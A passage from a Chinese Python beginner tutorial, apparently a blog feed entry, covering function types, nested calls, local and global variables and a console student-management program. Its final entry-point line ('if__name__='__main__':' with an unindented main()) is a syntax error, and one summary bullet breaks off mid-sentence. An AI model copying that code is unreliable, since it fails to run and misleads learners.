class="number">200</span>)</span><br><span class="line"><span class="built_in">print</span>(result2)  <span class="comment"># 打印202</span></span><br></pre></td></tr></table></figure><h1 id="四种函数类型"><a href="#四种函数类型" class="headerlink" title="四种函数类型"></a>四种函数类型</h1><p>函数根据有没有参数，有没有返回值，可以相互组合，一共有4种</p><ul><li>无参数，无返回值</li><li>无参数，有返回值</li><li>有参数，无返回值</li><li>有参数，有返回值</li></ul><h2 id="无参数无返回值函数"><a href="#无参数无返回值函数" class="headerlink" title="无参数无返回值函数"></a>无参数无返回值函数</h2><p>此类函数，不能接收参数，也没有返回值，一般情况下用来打印提示等类似的功能</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;点菜系统&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1.羊肉涮涮锅&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2.牛肉涮涮锅&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3.猪肉涮涮锅&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="无参数有返回值函数"><a href="#无参数有返回值函数" class="headerlink" title="无参数有返回值函数"></a>无参数有返回值函数</h2><p>此类函数，不能接收参数，但是可以返回某个数据，一般情况下像采集数据等功能会用到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取温度</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_temperature</span>():</span><br><span class="line">    <span class="comment"># 这里是获取温度的一些处理过程</span></span><br><span class="line">    <span class="comment"># 为了简单起见，先模拟返回一个数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">temperature = get_temperature()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前的温度为:%d&#x27;</span> % temperature)</span><br></pre></td></tr></table></figure><h2 id="有参数无返回值函数"><a href="#有参数无返回值函数" class="headerlink" title="有参数无返回值函数"></a>有参数无返回值函数</h2><p>此类函数，能接收参数，但不可以返回数据，一般情况下对某些变量设置数据而不需结果时用此类函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_age</span>(<span class="params">new_age</span>):</span><br><span class="line">    age = new_age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_age(<span class="number">18</span>)</span><br></pre></td></tr></table></figure><h2 id="有参数有返回值函数"><a href="#有参数有返回值函数" class="headerlink" title="有参数有返回值函数"></a>有参数有返回值函数</h2><p>此类函数，不仅能接收参数，还可以返回某个数据，一般情况下这类函数用的很多，毕竟我们调用一个函数还想获取它的结果的情况比较多</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算1~num的累积和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_nums</span>(<span class="params">num</span>):</span><br><span class="line">    sum_result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        sum_result += x</span><br><span class="line">    <span class="keyword">return</span> sum_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = add_nums(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1~100的累积和为:%d&#x27;</span> % result)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>函数根据有没有参数，有没有返回值可以相互组合</li><li>定义函数时，是根据实际的功能需求来设计的，所以不同开发人员编写的函数类型各不相同</li></ul><h1 id="函数之间互相隔离"><a href="#函数之间互相隔离" class="headerlink" title="函数之间互相隔离"></a>函数之间互相隔离</h1><h5 id="引入-2"><a href="#引入-2" class="headerlink" title="引入"></a>引入</h5><p>我们知道函数是一个具有独立功能的代码块，在前面的学习中知道一般情况下把一个个功能都单独做成一个个函数，像之前实现加减乘除就定义了4个函数</p><p>在开发时，把独立功能做成一个函数其实就是<code>封装</code>的思想，通过这种方式能够让代码更加整洁</p><p>打个比方，当我们离开家乡去远方上学时，往往会大包小包的拎着，每个包中肯定是相类似的物品，这样不仅携带方便在打开包裹取东西时也非常方便，这其实就是”封装“</p><p>Python中，根据封装的级别不同，我们会陆陆续续学习到函数、类、对象、模块、包等</p><p>“封装”最大的特点就是<code>高内聚低耦合</code>，大白话讲：相关的功能全部封装到函数中（这是高内聚），尽量减少函数与函数之间的依赖（低耦合），也就是说一个函数的改的对其他的函数来说没有影响</p><p>因此以后我们在编写代码的时候，谨记“高内聚低耦合”，尽量做到与函数与函数之间没有关系</p><p>大家要注意哦“低耦合”可不是”零耦合”，也就是函数之间多多少少还是有千丝万缕的关系，大白话讲：函数之间还是有些关系的</p><h5 id="函数之间的关系"><a href="#函数之间的关系" class="headerlink" title="函数之间的关系"></a>函数之间的关系</h5><p>根据代码的不同，存在3种关系</p><ul><li>可能共用同一个变量，会导致一函数添加了数据，另外一个函数删除了数据</li><li>可能一个函数的返回值，被当做另外一个函数的参数</li><li>可能一个函数体中调用了另外一个函数</li></ul><blockquote><p>共用一个变量</p></blockquote><p>使用全局变量来实现。后面会详细学习</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    <span class="comment"># 将处理结果存储到全局变量g_num中</span></span><br><span class="line">    g_num = <span class="number">100</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>():</span><br><span class="line">    <span class="built_in">print</span>(g_num)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 先调用test_1得到数据并且存到全局变量中</span></span><br><span class="line">test_1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再调用test_2打印test_1()处理过后的数据</span></span><br><span class="line">test_2()</span><br></pre></td></tr></table></figure><blockquote><p>函数的返回值被当做实参</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="number">50</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 先调用test_1获取该函数的返回值</span></span><br><span class="line">result = test_1()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用test_2时将test_1的返回值传入进去</span></span><br><span class="line">test_2(result)</span><br></pre></td></tr></table></figure><blockquote><p>函数中调用另外一个函数</p></blockquote><p>使用函数嵌套调用来实现。后面详细学习</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    <span class="comment"># 通过return将一个数据结果返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">20</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>():</span><br><span class="line">    <span class="comment"># 在test_2函数体中调用test_1并获取test_1的返回值</span></span><br><span class="line">    result = test_1()</span><br><span class="line">    <span class="comment"># 在当前函数体中处理数据</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用test_2完成数据处理</span></span><br><span class="line">test_2()</span><br></pre></td></tr></table></figure><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>函数的功能应该遵循“高内聚，低耦合”</p><p>函数之间有关系是肯定的，只要一个函数的改动尽量对另外函数没有影响这就是高品质的函数</p><p>至于函数之间的3种关系以及实现方式，需要多练习，当写的代码多了，总结的也多了，相信你的感觉也就到位了</p><h1 id="函数嵌套调用"><a href="#函数嵌套调用" class="headerlink" title="函数嵌套调用"></a>函数嵌套调用</h1><h5 id="什么是函数嵌套调用？"><a href="#什么是函数嵌套调用？" class="headerlink" title="什么是函数嵌套调用？"></a>什么是函数嵌套调用？</h5><p>一种函数中又调用了另外一个函数的方式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--- test_1 start ---&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;这里是test_1函数执行的代码...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--- test_1 end ---&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--- test_2 start ---&#x27;</span>)</span><br><span class="line">    test_1()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;--- test_2 end ---&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">test_2()</span><br></pre></td></tr></table></figure><h5 id="函数嵌套的作用"><a href="#函数嵌套的作用" class="headerlink" title="函数嵌套的作用"></a>函数嵌套的作用</h5><p>能够让函数之间互相使用，增加代码复用性</p><p>打个比方，你已经写好了一个功能把它封装为了函数，我再实现另外一个功能的时候发现也需要你写的那个功能函数，此时我不用再写一遍，而是直接将你写的代码拿来用即可，此时我的函数与你的函数都在一个<code>.py</code>文件中，想要用你的函数，我就必须在我写的函数中调用</p><h5 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h5><p>案例一：</p><ol><li>写一个函数：打印一条横线</li><li>写另外一个函数：打印自定义行数的横线</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印一条横线</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_1_line</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印多条横线</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_num_line</span>(<span class="params">num</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 因为print_1_line函数已经完成了打印横线的功能，</span></span><br><span class="line">    <span class="comment"># 只需要多次调用此函数即可</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; num:</span><br><span class="line">        print_1_line()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">print_num_line(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>案例二：</p><ol><li>写一个函数：计算三个数的和</li><li>写一个函数：计算三个数的平均值</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 求3个数的和</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sum_3_number</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b + c  <span class="comment"># return 的后面可以是数值，也可是一个表达式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成对3个数求平均值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">average_3_umber</span>(<span class="params">a, b, c</span>):</span><br><span class="line">    <span class="comment"># 因为sum_3_number函数已经完成了3个数的就和，所以只需调用即可</span></span><br><span class="line">    <span class="comment"># 即把接收到的3个数，当做实参传递即可</span></span><br><span class="line">    sum_result = sum_3_number(a, b, c)</span><br><span class="line">    ave_result = sum_result / <span class="number">3.0</span></span><br><span class="line">    <span class="keyword">return</span> ave_result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数，完成对3个数求平均值</span></span><br><span class="line">result = average_3_umber(<span class="number">11</span>, <span class="number">2</span>, <span class="number">55</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;average is %d&quot;</span> % result)</span><br></pre></td></tr></table></figure><h1 id="局部变量与全局变量"><a href="#局部变量与全局变量" class="headerlink" title="局部变量与全局变量"></a>局部变量与全局变量</h1><h5 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h5><h6 id="什么是局部变量？"><a href="#什么是局部变量？" class="headerlink" title="什么是局部变量？"></a>什么是局部变量？</h6><p>在函数中定义的变量，包括形参变量也是局部变量，只能在定义它的函数中用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    a = <span class="number">300</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test_1在修改前的a的值为：<span class="subst">&#123;a&#125;</span>&#x27;</span>)  <span class="comment"># f表达式：使用大括号进行占位，要打印的数据直接使用保存数值的变量名称</span></span><br><span class="line">    a = <span class="number">200</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test_1在修改后的a的值为：<span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>():</span><br><span class="line">    a = <span class="number">400</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;函数test_2中的局部变量为: %d&#x27;</span> % a)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">test_1()</span><br><span class="line">test_2()</span><br></pre></td></tr></table></figure><h6 id="局部变量的作用"><a href="#局部变量的作用" class="headerlink" title="局部变量的作用"></a>局部变量的作用</h6><p>我们知道函数要尽量遵循“高内聚，低耦合”也就是一个函数的功能尽量独立，为了实现这些功能就免不了进行各种数学运算，想要运算就需要变量，此时在函数中定义变量的需求也就自然而然的来了</p><p>所以说，局部变量一般就是为了实现这个函数中的功能而定义的变量，只能在当前函数中使用，其他函数不能使用</p><h6 id="局部变量的特点"><a href="#局部变量的特点" class="headerlink" title="局部变量的特点"></a>局部变量的特点</h6><ul><li>局部变量，就是在函数内部定义的变量</li><li>形参也属于局部变量</li><li>其作用范围是这个函数内部，即只能在这个函数中使用，在函数的外部是不能使用的</li><li>每次调用函数时，局部变量都会重新使用，而不是用上一次调用函数时留下的数据</li><li>因为其作用范围只是在自己的函数内部，所以不同的函数可以定义相同名字的局部变量（打个比方，把你、我是当做成函数，把局部变量理解为每个人手里的手机，你可有个iPhone12，我当然也可以有个iPhone12， 互不相关）</li></ul><h5 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h5><h6 id="什么是全局变量？"><a href="#什么是全局变量？" class="headerlink" title="什么是全局变量？"></a>什么是全局变量？</h6><p>一种在函数外部定义的变量，可以在所有函数中共用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_1</span>():</span><br><span class="line">    a = <span class="number">300</span>  <span class="comment"># 局部变量</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test_1修改前a的值为: <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line">    a = <span class="number">200</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test_1修改后a的值为: <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;test_2获取全局变量的值为: <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">test_1()</span><br><span class="line">test_2()</span><br></pre></td></tr></table></figure><h6 id="全局变量的作用"><a href="#全局变量的作用" class="headerlink" title="全局变量的作用"></a>全局变量的作用</h6><p>局部变量它的作用范围就只能在定义它的函数中用，而有时为了能够在多个函数之间共用某个数据，此时就有了全局变量</p><p>打个比方：有2个兄弟各自有手机，各自有自己的小秘密在手机里，不让另外一方使用（可以理解为局部变量）；但是家里的电话是2个兄弟都可以随便使用的（可以理解为全局变量）</p><h6 id="全局变量的使用方式"><a href="#全局变量的使用方式" class="headerlink" title="全局变量的使用方式"></a>全局变量的使用方式</h6><p>定义全局变量：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">a = <span class="number">100</span></span><br></pre></td></tr></table></figure><p>获取全局变量：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)  <span class="comment"># 虽然没有定义变量a但是依然可以获取其数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">test1()</span><br></pre></td></tr></table></figure><p>修改全局变量：</p><p>如果一个函数中需要修改全局的值，此时我们需要用<code>global</code>进行声明</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义全局变量</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test1</span>():</span><br><span class="line">    <span class="built_in">print</span>(a)  <span class="comment"># 虽然没有定义变量a但是依然可以获取其数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line">    <span class="keyword">global</span> a  <span class="comment"># 如果一个函数中需要修改全局的值，此时我们需要用globa进行声明</span></span><br><span class="line">    a += <span class="number">1</span>  <span class="comment"># 修改全局变量</span></span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数</span></span><br><span class="line">test1()</span><br></pre></td></tr></table></figure><h6 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h6><ul><li>在函数外边定义的变量叫做<code>全局变量</code></li><li>全局变量能够在所有的函数中进行访问</li><li>当函数内出现局部变量和全局变量相同名字时，函数内部中的 <code>变量名 = 数据</code> 此时理解为定义了一个局部变量，而不是修改全局变量的值</li><li>如果在函数中出现<code>global 全局变量的名字</code> 那么这个函数中即使出现和全局变量名相同的<code>变量名 = 数据</code> 也理解为对全局变量进行修改，而不是定义局部变量</li><li>若是在函数中修改全局列表的值，不用global~~</li><li>如果在一个函数中需要对多个全局变量进行修改，那么可以使用</li></ul><h1 id="函数案例：学生管理系统"><a href="#函数案例：学生管理系统" class="headerlink" title="函数案例：学生管理系统"></a>函数案例：学生管理系统</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName: test.py</span></span><br><span class="line"><span class="comment"># @Time    : 2022/9/26 2:05 下午</span></span><br><span class="line"><span class="comment"># @Author  : 顾安</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定一个列表，用来存储所有的学生信息(每个学生是一个字典)</span></span><br><span class="line">info_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_menu</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---------------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;      学生管理系统 V1.0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 1:添加学生&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 2:删除学生&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 3:修改学生&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 4:查询学生&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 5:显示所有学生&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 6:退出系统&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;---------------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_new_info</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;添加学生信息&quot;&quot;&quot;</span></span><br><span class="line">    new_name = <span class="built_in">input</span>(<span class="string">&quot;请输入姓名:&quot;</span>)</span><br><span class="line">    new_tel = <span class="built_in">input</span>(<span class="string">&quot;请输入手机号:&quot;</span>)</span><br><span class="line">    new_qq = <span class="built_in">input</span>(<span class="string">&quot;请输入QQ:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> temp_info <span class="keyword">in</span> info_list:</span><br><span class="line">        <span class="keyword">if</span> temp_info[<span class="string">&#x27;name&#x27;</span>] == new_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;此用户名已经被占用,请重新输入&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 如果一个函数只有return就相当于让函数结束，没有返回值</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义一个字典，用来存储用户的学生信息(这是一个字典)</span></span><br><span class="line">    <span class="comment">#如果说用info = &#123;&#125;的方式定义字典，那么别人会不容易区分这到底是一个集合还是字典</span></span><br><span class="line">    info = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向字典中添加数据</span></span><br><span class="line">    info[<span class="string">&quot;name&quot;</span>] = new_name</span><br><span class="line">    info[<span class="string">&quot;tel&quot;</span>] = new_tel</span><br><span class="line">    info[<span class="string">&quot;qq&quot;</span>] = new_qq</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向列表中添加这个字典</span></span><br><span class="line">    info_list.append(info)</span><br><span class="line">    <span class="built_in">print</span>(info_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_info</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;删除学生信息&quot;&quot;&quot;</span></span><br><span class="line">    del_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入要删除的序号:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= del_num &lt; <span class="built_in">len</span>(info_list):</span><br><span class="line">        del_flag = <span class="built_in">input</span>(<span class="string">&quot;你确定要删除么?yes or no: &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> del_flag == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">            <span class="keyword">del</span> info_list[del_num]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入序号有误,请重新输入&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify_info</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;修改学生信息&quot;&quot;&quot;</span></span><br><span class="line">    modify_num = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入要修改的序号:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= modify_num &lt; <span class="built_in">len</span>(info_list):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你要修改的信息是:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;姓名:%s, 手机:%s, QQ:%s&quot;</span> % (info_list[modify_num][<span class="string">&#x27;name&#x27;</span>],</span><br><span class="line">                                       info_list[modify_num][<span class="string">&#x27;tel&#x27;</span>], info_list[modify_num][<span class="string">&#x27;qq&#x27;</span>]))</span><br><span class="line">        info_list[modify_num][<span class="string">&#x27;name&#x27;</span>] = <span class="built_in">input</span>(<span class="string">&quot;请输入新的姓名:&quot;</span>)</span><br><span class="line">        info_list[modify_num][<span class="string">&#x27;tel&#x27;</span>] = <span class="built_in">input</span>(<span class="string">&quot;请输入新的手机号:&quot;</span>)</span><br><span class="line">        info_list[modify_num][<span class="string">&#x27;qq&#x27;</span>] = <span class="built_in">input</span>(<span class="string">&quot;请输入新QQ:&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入序号有误,请重新输入&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_info</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查询学生信息&quot;&quot;&quot;</span></span><br><span class="line">    search_name = <span class="built_in">input</span>(<span class="string">&quot;请输入要查询的学生姓名:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> temp_info <span class="keyword">in</span> info_list:</span><br><span class="line">        <span class="keyword">if</span> temp_info[<span class="string">&#x27;name&#x27;</span>] == search_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;查询到的信息如下:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;姓名:%s, 手机:%s, QQ:%s&quot;</span> % (temp_info[<span class="string">&#x27;name&#x27;</span>], temp_info[<span class="string">&#x27;tel&#x27;</span>], temp_info[<span class="string">&#x27;qq&#x27;</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有您要找的信息....&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_all_info</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;遍历学生信息&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;序号\t\t姓名\t\t手机号\t\tQQ&quot;</span>)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> info_list:</span><br><span class="line">        <span class="comment"># temp是一个字典</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%d\t\t%s\t\t%s\t%s&quot;</span> % (i, temp[<span class="string">&#x27;name&#x27;</span>], temp[<span class="string">&#x27;tel&#x27;</span>], temp[<span class="string">&#x27;qq&#x27;</span>]))</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;用来控制整个流程&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 1. 打印功能</span></span><br><span class="line">        print_menu()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 获取用户的选择</span></span><br><span class="line">        num = <span class="built_in">input</span>(<span class="string">&quot;请输入要进行的操作(数字): &quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 根据用户选择,做相应的事情</span></span><br><span class="line">        <span class="keyword">if</span> num == <span class="string">&quot;1&quot;</span>:</span><br><span class="line">            <span class="comment"># 添加学生</span></span><br><span class="line">            add_new_info()</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="string">&quot;2&quot;</span>:</span><br><span class="line">            <span class="comment"># 删除学生</span></span><br><span class="line">            del_info()</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="string">&quot;3&quot;</span>:</span><br><span class="line">            <span class="comment"># 修改学生</span></span><br><span class="line">            modify_info()</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="string">&quot;4&quot;</span>:</span><br><span class="line">            <span class="comment"># 查询学生</span></span><br><span class="line">            search_info()</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="string">&quot;5&quot;</span>:</span><br><span class="line">            <span class="comment"># 遍历所有的信息</span></span><br><span class="line">            print_all_info()</span><br><span class="line">        <span class="keyword">elif</span> num == <span class="string">&quot;6&quot;</span>:</span><br><span class="line">            <span class="comment"># 退出系统</span></span><br><span class="line">            exit_flag = <span class="built_in">input</span>(<span class="string">&quot;亲,你确定要退出么?~~~~(&gt;_&lt;)~~~~(yes or no): &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> exit_flag == <span class="string">&quot;yes&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入有误,请重新输入......&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&quot;\n\n\n按回车键继续....&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;clear&quot;</span>)  <span class="comment"># 调用Linux命令clear完成清屏</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序的开始</span></span><br><span class="line"><span class="comment">#如果当前文件被当成一个包被其他py文件进行import引入的话</span></span><br><span class="line"><span class="comment">#可以使用__name__防止在其他文件中被执行</span></span><br><span class="line">if__name__=<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
